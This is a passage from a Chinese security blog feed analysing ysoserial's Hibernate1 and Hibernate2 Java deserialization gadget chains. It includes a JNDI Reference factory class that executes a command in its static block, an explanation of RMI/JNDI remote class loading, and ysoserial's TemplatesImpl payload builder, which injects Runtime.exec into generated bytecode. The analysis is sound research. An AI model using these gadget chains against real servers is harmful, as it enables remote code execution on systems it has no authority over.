keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 4474289574195395731L<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open /Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exec</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String sb <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        BufferedInputStream in <span class="token operator">=</span> <span class="token keyword">new</span>                 <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以看到在静态代码块中写有我们要执行的命令</p><p>我们先启动server端和http server。然后运行client端就可以出发命令执行<img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/27.png" alt="27"></p><p>这是为什么呢？在第三节中我们简单介绍了RMI，RMI可以进行远程方法调用，RMI还可以进行动态类加载，即可以从一个远程服务器以http://、ftp://、file://等形式动态加载一个.class文件到本地然后进行操作。但是这种RMI动态类加载的限制极大。有以下要求</p><ol><li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。</li><li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li></ol><p>我们使用JNDI同样可以进行动态类加载，而且限制相比于使用RMI要小很多。在jdk1.7.0_21版本我们可以不做任何配置直接进行远程class的加载。</p><p>但当jdk版本大于等于JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。</p><p>我们更换jdk版本演示一下，可以看到jdk版本为1.8.0._221时会抛出com.sun.jndi.rmi.object.trustURLCodebase 为flase的异常</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/28.png" alt="28"></p><p>至此 ysoserial Hibernate2 漏洞原理分析完毕，感谢观看。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>此次漏洞利用的思路相较于之前的Hibernate1 主要变化在最终触发命令执行的类由TemplatesImpl类变成了JdbcRowSetImpl类，最终执行漏洞方式又由加载本地通过动态字节码生成的类从而触发其静态代码块中的恶意代码换成了通过RMI+JNDI+Reference, 然后最终由lookup()方法动态加载一个远程class文件从而触发其静态代码块中的恶意代码。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ysoserial </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Hibernate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化系列 ysoserial Hibernate1</title>
      <link href="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/"/>
      <url>/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化系列-ysoserial-Hibernate1"><a href="#Java反序列化系列-ysoserial-Hibernate1" class="headerlink" title="Java反序列化系列 ysoserial Hibernate1"></a>Java反序列化系列 ysoserial Hibernate1</h1><h2 id="1-Hibernate简介"><a href="#1-Hibernate简介" class="headerlink" title="1.Hibernate简介"></a>1.Hibernate简介</h2><p>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JaveEE架构中取代CMP，完成数据持久化的重任。</p><h2 id="2-Java动态字节码生成"><a href="#2-Java动态字节码生成" class="headerlink" title="2.Java动态字节码生成"></a>2.Java动态字节码生成</h2><p>通过分析Hibernate1 playload 的构造过程 使用了Java的动态字节码生成的技术，这里针对该技术来提前进行一下讲解</p><p>什么是动态字节码生成，相信大家听字面意思也能大致有个概念，众所周知java是编译型语言，所有的.java文件最终都要编译成.class后缀的字节码形式。</p><p>那我们可不可以绕过.java直接操纵编译好的字节码呢？当然可以，java的反射机制就是在程序运行期去操纵字节码从而获得像方法名，属性名，构造函数，等等并对其进行操作。</p><p>当然这个只是对已经编译好的类来进行操作，我们可不可以在java运行期让程序自动生成一个.class字节码文件，其实说是生成，给我的感觉更多像是组装一个.class文件</p><p>当然也是可以的，Java为我们提供了两种方式。</p><p><strong>ASM</strong> ：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p><p><strong>Javassit</strong>: 提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。</p><p>javassit是一个第三方jar包我们可以通过maven以以下方式导入</p><pre class=" language-xml"><code class="language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.19.0-GA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。它已加入了开放源代码JBoss 应用服务器项目,通过使用Javassist对字节码操作为JBoss实现动态AOP框架。javassist是jboss的一个子项目，其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p><p>Javassist中最为重要的是ClassPool，CtClass ，CtMethod 以及 CtField这几个类。</p><p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p><p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p><p>CtMethods：表示类中的方法。</p><p>CtFields ：表示类中的字段。<br>接下来通过代码来进行演示</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavassisTest1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Loader loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Loader</span><span class="token punctuation">(</span>pool<span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass ct <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"JavassistTestResult"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建类</span>        ct<span class="token punctuation">.</span><span class="token function">setInterfaces</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>pool<span class="token punctuation">.</span><span class="token function">makeInterface</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//让该类实现Serializable接口</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            CtField f<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span>CtClass<span class="token punctuation">.</span>intType<span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">,</span>ct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成一个字段 类型为int 名字为id</span>            f<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span>AccessFlag<span class="token punctuation">.</span>PUBLIC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将字段设置为public</span>            ct<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将字段设置到类上</span>            CtConstructor constructor<span class="token operator">=</span>CtNewConstructor<span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public GeneratedClass(int pId){this.id=pId;}"</span><span class="token punctuation">,</span>ct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加构造函数</span>            ct<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>            CtMethod helloM<span class="token operator">=</span>CtNewMethod<span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public void hello(String des){ System.out.println(des);}"</span><span class="token punctuation">,</span>ct<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加方法</span>            ct<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>helloM<span class="token punctuation">)</span><span class="token punctuation">;</span>            ct<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">"/Users/IdeaProjects/Apache_ShardingSphere/Test5/target/classes/com/javassistTest/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将生成的.class文件保存到磁盘</span>            Class <span class="token class-name">c</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"JavassistTestResult"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Constructor constructor1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object object <span class="token operator">=</span> constructor1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CannotCompileException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行后的结果，可以看到在对应的目录下生成了我们输入的类名“JavassistTestResult”同名的class文件</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/2.png" alt="2"></p><p>我们看一看该class文件的源码</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/3.png" alt="3"></p><p>可以看到该类的代码与我们调用javassist所示所输入的内容完全相同，该class文件就是我们通过调用javassist所提供的类与方法在运行时期动态生成的。</p><p>我们测试一下动态生成的类是否真的可用</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JavassisTest3</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token string">"/Users/IdeaProjects/Apache_ShardingSphere/Test5/target/classes/com/javassistTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Loader loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Loader</span><span class="token punctuation">(</span>pool<span class="token punctuation">)</span><span class="token punctuation">;</span>            Class <span class="token class-name">clazz</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"JavassistTestResult"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Constructor constructor1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object object <span class="token operator">=</span> constructor1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class <span class="token class-name">clazz1</span> <span class="token operator">=</span> object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String className <span class="token operator">=</span> clazz1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field field <span class="token operator">=</span> clazz1<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String fieldName <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"className: "</span><span class="token operator">+</span>className<span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span><span class="token string">"fieldName: "</span><span class="token operator">+</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> <span class="token operator">|</span> ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以下是执行结果，可以确定我们动态生成的类是确实可用的。</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/5.png" alt="5"></p><p>以上就是对javassist这个动态字节码生成技术的一些简介。</p><h2 id="3-Hibernate1-源码深度解析"><a href="#3-Hibernate1-源码深度解析" class="headerlink" title="3.Hibernate1 源码深度解析"></a>3.Hibernate1 源码深度解析</h2><p>首先先看一下生成playload的最主要的一段代码</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/6.png" alt="6"></p><p>挑一些比较关键的点进行讲解，首先先看Gadgets.createTemplatesImpl()方法</p><p><img src="/2020/05/31/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate1/7.png" alt="7"></p><p>以下是该方法的详细实现代码，我们来仔细观察，首先是通过TemplatesImpl.class实例化了一个TemplatesImpl对象，紧接着就是用到了我们刚才讲的动态字节码生成javassist</p><pre class=" language-java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">StubTransletPayload</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/**此类为Gadget类的静态内部类*/</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span>5971610431559700674L<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span> <span class="token punctuation">(</span> DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers <span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span> <span class="token punctuation">(</span> DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler <span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">createTemplatesImpl</span> <span class="token punctuation">(</span> <span class="token keyword">final</span> String command<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> tplClass<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> abstTranslet<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> transFactory <span class="token punctuation">)</span>                <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            <span class="token keyword">final</span> T templates <span class="token operator">=</span> tplClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// use template gadget class</span>            ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>StubTransletPayload<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>abstTranslet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> CtClass clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>StubTransletPayload<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// run command in static initializer</span>            <span class="token comment" spellcheck="true">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span>            String cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="token operator">+</span>                command<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">,</span><span class="token string">"\\\\\\\\"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"\\\""</span><span class="token punctuation">)</span> <span class="token operator">+</span>                <span class="token string">"\");"</span><span class="token punctuation">;</span>            clazz<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**此刻通过javassist对当前Gadget类的StubTransletPayload这个静态内部类进行了修改             * 在修改后的字节码中加入了一个静态代码块,             * 代码块里的内容就是通过绝对路径使用Runtime.exec来执行"open /Applications/Calculator.app" */</span>            <span class="token comment" spellcheck="true">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span>            clazz<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"ysoserial.Pwner"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**至此生成了一个以StubTransletPayload为模板切继承了AbstractTranslet类的一个class所在包为ysoserial             * ，该类的名字为Pwner加上一个随机数，             * 紧接着将其变为字节码*/</span>            <span class="token comment" spellcheck="true">// inject class bytes into instance</span>            Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>                classBytes<span class="token punctuation">,</span> ClassFiles<span class="token punctuation">.</span><span class="token function">classAsBytes</span><span class="token punctuation">(</span>Foo<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// required to make TemplatesImpl happy</span>            Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Pwnr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> transFactory<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> templates<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/**此时的TemplatesImpl对象里的_bytecodes属性，             * 里面存放了两个类的字节码，一个是以实现了AbstractTranslet类的StubTransletPayload对象为模板用javassists生成的一个类对象,             * 